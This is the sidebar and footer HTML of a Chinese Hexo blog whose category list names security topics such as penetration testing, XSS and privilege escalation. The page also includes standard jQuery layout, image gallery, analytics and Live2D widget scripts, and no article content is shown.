     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/git/hexo/">hexo</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/windows/Windows2003/">Windows2003</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/">提权免杀</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/windows提权/">windows提权</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">新浪微博</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Larry Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
		
		<a href="/about" target="_blank" title="小虫">小虫</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>












<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
 </html>
